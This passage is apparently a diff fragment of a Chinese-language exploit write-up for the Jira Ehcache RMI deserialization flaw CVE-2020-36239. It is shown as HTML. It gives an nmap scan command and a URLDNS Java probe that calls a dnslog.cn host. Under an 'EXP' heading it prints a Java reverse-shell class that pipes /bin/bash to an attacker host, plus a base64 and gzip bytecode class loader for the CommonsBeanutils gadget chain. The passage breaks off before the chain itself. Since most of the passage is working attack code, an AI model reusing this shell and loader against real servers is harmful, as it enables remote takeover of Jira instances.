+<p>&#x6839;&#x636E;&#x5B98;&#x65B9;&#x7684;&#x63CF;&#x8FF0;&#x8BE5;&#x6F0F;&#x6D1E;&#x662F;&#x56E0;&#x4E3A;: &#x66B4;&#x9732;&#x4E86;&#x4E00;&#x4E2A; Ehcache RMI &#x7F51;&#x7EDC;&#x670D;&#x52A1;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x5728;&#x7AEF;&#x53E3; 40001 &#x548C;&#x6F5C;&#x5728;&#x7684; 40011 &#x4E0A;&#x8FDE;&#x63A5;&#x5230;&#x8BE5;&#x670D;&#x52A1;&#xFF0C;&#x7531;&#x4E8E;&#x7F3A;&#x5C11;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5728; Jira &#x4E2D;&#x6267;&#x884C;&#x4ED6;&#x4EEC;&#x9009;&#x62E9;&#x7684;&#x4EFB;&#x610F;&#x4EE3;&#x7801;
+&#x4F7F;&#x7528;Nmap&#x626B;&#x63CF;</p>
+<pre class="language-"><code class="lang-shell">nmap -T <span class="token number">4</span> -A <span class="token number">10.1</span>.1.13  -p <span class="token number">40001</span>
+</code></pre>
+<p><a href="Jira_CVE2020-36239_RCE.assets/2023_05_19_16_08_48_YUI0jVfw.png" data-lightbox="c481f18e-5199-4ff0-b16a-90d3076e5f28" data-title="image.png"><img src="Jira_CVE2020-36239_RCE.assets/2023_05_19_16_08_48_YUI0jVfw.png" alt="image.png"></a>
+&#x5176;&#x4E2D;&#x7ED1;&#x5B9A;&#x7684;name&#x4E3A;<code>rmi://com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey</code>;&#x7ED1;&#x5B9A;&#x7684;&#x5B9E;&#x4F8B;&#x63A5;&#x53E3;&#x4E3A;<code>net.sf.ehcache.distribution.RMICachePeer_Stub</code></p>
+<h3 id="&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;"><a name="&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;" class="anchor-navigation-ex-anchor" href="#&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.1. &#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;</h3>
+<p>&#x5728; net.sf.ehcache.distribution.RMICachePeer_Stub &#x627E;&#x89E6;&#x53D1;&#x70B9;, &#x5B98;&#x65B9;&#x901A;&#x62A5;&#x4E2D;&#x8BF4;&#x662F; Ehcache &#x66B4;&#x9732;&#x7684; RMI &#x670D;&#x52A1;&#xFF0C;&#x6240;&#x4EE5;&#x5B9E;&#x4F53;&#x7C7B;&#x5E94;&#x8BE5;&#x4E5F;&#x5728; Ehcache &#x5305;&#x91CC;
+&#x5728;&#x7ED1;&#x5B9A;&#x7684; <code>net.sf.ehcache.distribution.RMICachePeer_Stub</code>&#x7C7B;&#x4E2D;&#x7684; <code>getQuiet</code>&#x65B9;&#x6CD5;&#x63A5;&#x6536;&#x7684;&#x53C2;&#x6570;&#x662F; <code>Serializeable</code>&#x5BF9;&#x8C61;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x662F;&#x6F0F;&#x6D1E;&#x7684;&#x89E6;&#x53D1;&#x70B9;
+<a href="Jira_CVE2020-36239_RCE.assets/2023_05_19_16_08_49_kNeYuawU.png" data-lightbox="5a70a773-d293-42a2-bb22-0e2d20836997" data-title="image.png"><img src="Jira_CVE2020-36239_RCE.assets/2023_05_19_16_08_49_kNeYuawU.png" alt="image.png"></a></p>
+<h2 id="&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;"><a name="&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;" class="anchor-navigation-ex-anchor" href="#&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. &#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;</h2>
+<p>&#x6240;&#x6709;&#x7ED1;&#x5B9A;&#x7684; name, &#x90FD;&#x662F;&#x7ED1;&#x5B9A; net.sf.ehcache.distribution.RMICachePeer_Stub, &#x6240;&#x4EE5;&#x968F;&#x673A;&#x9009;&#x4E00;&#x4E2A;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#xFF0C; &#x4F7F;&#x7528; URLDNS &#x9A8C;&#x8BC1;&#x4E86;&#x6F0F;&#x6D1E;&#x786E;&#x5B9E;&#x5B58;&#x5728;</p>
+<pre class="language-"><code class="lang-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>myproject<span class="token punctuation">.</span>temp</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>sf<span class="token punctuation">.</span>ehcache<span class="token punctuation">.</span>distribution<span class="token punctuation">.</span></span><span class="token class-name">RMICachePeer_Stub</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
+        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">&quot;http://vd2vvt.dnslog.cn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token string">&quot;hhh&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> field <span class="token operator">=</span> URL<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;hashCode&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">RMICachePeer_Stub</span> rmiCachePeer_stub <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RMICachePeer_Stub</span><span class="token punctuation">)</span> <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;rmi://10.1.1.13:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        rmiCachePeer_stub<span class="token punctuation">.</span><span class="token function">getQuiet</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><a href="Jira_CVE2020-36239_RCE.assets/2023_05_19_16_08_49_PR0jwHOI.png" data-lightbox="46249401-99ab-4c18-a624-e8e2a8283370" data-title="image.png"><img src="Jira_CVE2020-36239_RCE.assets/2023_05_19_16_08_49_PR0jwHOI.png" alt="image.png"></a>
+&#x901A;&#x8FC7;&#x67E5;&#x770B;Jira &#x662F;&#x5426;&#x7528;&#x4E86;&#x5B58;&#x5728;&#x5229;&#x7528;&#x94FE;&#x7684;&#x5305;&#xFF0C;Commons-Collection &#x90FD;&#x7528;&#x4E86;&#x76F8;&#x5BF9;&#x5B89;&#x5168;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x4F46;&#x662F; Commons-Beanutils 1.9.4 &#x5B58;&#x5728;&#x5229;&#x7528;&#x94FE;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;CB1&#x6765;&#x6784;&#x9020;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;</p>
+<h3 id="exp"><a name="exp" class="anchor-navigation-ex-anchor" href="#exp"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.1. EXP</h3>
+<p>&#x9996;&#x5148;&#x7F16;&#x5199;shell.java&#xFF0C;&#x5229;&#x7528;socket &#x7F16;&#x7A0B;&#x53CD;&#x5F39;shell&#x5230;&#x76EE;&#x6807;&#x5730;&#x5740;&#xFF0C;&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x4E00;&#x5B9A;&#x8981;&#x5199;&#x8FDB;&#x65E0;&#x53C2;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x5229;&#x7528;CB1&#x94FE;&#xFF0C;&#x901A;&#x8FC7;javassit&#x5199;&#x5165;&#x5230;&#x65B0;&#x7684;&#x7C7B;&#xFF0C;&#x518D;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x6210;bytecode &#x653E;&#x5728;TemplatesImpl._bytecodes&#x65F6;&#xFF0C;&#x6700;&#x540E;&#x6267;&#x884C;&#x7684;&#x662F;newInstance()&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x9700;&#x8981;&#x653E;&#x5728;&#x6784;&#x9020;&#x51FD;&#x6570;&#x4E2D;</p>
+<pre class="language-"><code class="lang-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>myproject<span class="token punctuation">.</span>temp</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> shell <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span><span class="token punctuation">{</span>
+            <span class="token class-name">String</span> host <span class="token operator">=</span> <span class="token string">&quot;xxx.xxx.xxx.xxx&quot;</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> port <span class="token operator">=</span> port<span class="token punctuation">;</span>
+            <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">;</span>
+            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Process</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>Socket</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>Socket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStream</span> pi <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pe <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> si <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>OutputStream</span> po <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> so <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">while</span> <span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">while</span> <span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">while</span> <span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    po<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                so<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                po<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    p<span class="token punctuation">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>&#x7136;&#x540E;&#x9700;&#x8981;&#x7F16;&#x5199;&#x4E00;&#x4E2A;ClassLoader&#xFF0C;&#x8BA9;javassist&#x4ECE;&#x6E90;&#x4E2D;&#x8BFB;&#x53D6;&#x8BE5;&#x7C7B;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;CtClass&#x5BF9;&#x8BE5;&#x7C7B;&#x6587;&#x4EF6;&#x7684;&#x5BF9;&#x8C61;&#x7684;&#x5F15;&#x7528;&#xFF0C;&#x4E3B;&#x8981;&#x539F;&#x56E0;&#x662F;&#x56E0;&#x4E3A;&#x8981;&#x5C06;shell.class &#x8F6C;&#x6362;&#x6210;base64&#x7F16;&#x7801;&#x8FDB;&#x884C;&#x5199;&#x5165;&#xFF0C;&#x6700;&#x540E;&#x518D;&#x901A;&#x8FC7;classloader&#x8FDB;&#x884C;&#x89E3;&#x7801;&#xFF0C;&#x518D;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x6210;bytecode&#xFF0C;&#x653E;&#x5165;&#x5230;Templates._bytecode&#x4E2D;
+&#x8FD9;&#x91CC;&#x53C2;&#x8003;&#x7684;&#x662F;<a href="https://github.com/Y4er/ysoserial" target="_blank">Y4er&#x2014;&#x2014;ysoserial</a>&#x5927;&#x54E5;&#x66F4;&#x6539;&#x540E;&#x7684;&#x9879;&#x76EE;</p>
+<pre class="language-"><code class="lang-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>myproject<span class="token punctuation">.</span>temp</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span><span class="token class-name">GZIPInputStream</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderTemplate</span> <span class="token punctuation">{</span>
+    <span class="token keyword">static</span> <span class="token class-name">String</span> b64<span class="token punctuation">;</span>
+
+    <span class="token keyword">static</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token class-name">GZIPInputStream</span> gzipInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GZIPInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token function">base64Decode</span><span class="token punctuation">(</span>b64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4096</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> read<span class="token punctuation">;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>read <span class="token operator">=</span> gzipInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bs<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> read<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">Method</span> defineClass <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">&quot;defineClass&quot;</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            defineClass<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">Class</span> invoke <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defineClass<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>classLoader<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            invoke<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment">// e.printStackTrace();</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;java.util.Base64&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">&quot;getDecoder&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">&quot;decode&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bs<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;sun.misc.BASE64Decoder&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">&quot;decodeBuffer&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bs<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>&#x6700;&#x540E;&#x518D;&#x5C06;CB1&#x7684;&#x903B;&#x8F91;&#x5B8C;&#x6210;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;</p>
